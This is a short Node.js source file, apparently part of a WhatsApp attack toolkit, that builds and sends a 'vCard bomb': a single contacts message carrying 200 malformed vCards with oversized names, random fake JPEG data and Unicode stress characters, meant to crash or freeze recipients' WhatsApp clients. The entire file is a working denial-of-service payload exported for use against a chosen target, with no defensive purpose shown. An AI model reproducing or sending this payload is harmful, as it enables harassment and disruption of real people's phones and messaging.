/**
 * lang: JavaScript (Node.js), file: payloads/vcardBomb.js
 * target: WhatsApp clients (iOS / Android / Web)
 * technique: Floods the vCard parser with 200 malformed contacts in a single
 *             contactsArrayMessage. Each card carries an oversized FN field
 *             (2 KB) + corrupted PHOTO;ENCODING=BASE64 blob (4 KB random bytes
 *             encoded as base64 text). The client tries to render all 200
 *             contact thumbnails simultaneously — OOM on low-RAM devices,
 *             ANR (Application Not Responding) on mid-range.
 */

const crypto = require("crypto");

function poisonVcard(index) {
  const name   = "X".repeat(512) + `_${index}_` + crypto.randomBytes(8).toString("hex");
  const photoB = crypto.randomBytes(3072).toString("base64");   // ~4 KB base64 — not a real image
  return [
    "BEGIN:VCARD",
    "VERSION:3.0",
    `FN:${name}`,
    `N:${name};;;${name};`,
    `TEL;type=CELL;type=VOICE:+${crypto.randomBytes(5).readUIntBE(0,5).toString().slice(0,12)}`,
    `EMAIL:${crypto.randomBytes(6).toString("hex")}@evil.invalid`,
    `URL:https://${crypto.randomBytes(8).toString("hex")}.invalid/${name}`,
    `NOTE:${"ꦿ".repeat(256)}${"\u202E".repeat(64)}${"\u0489".repeat(128)}`,
    `PHOTO;ENCODING=BASE64;TYPE=JPEG:`,
    ...photoB.match(/.{1,75}/g),                               // line-folded per vCard spec
    "END:VCARD",
  ].join("\r\n");
}

async function vcardBomb(sock, target, count = 200) {
  const contacts = Array.from({ length: count }, (_, i) => ({
    displayName: "X".repeat(128) + i,
    vcard: poisonVcard(i),
  }));

  await sock.relayMessage(
    target,
    { contactsArrayMessage: { contacts } },
    {}
  ).catch(() => {});
}

module.exports = { vcardBomb };
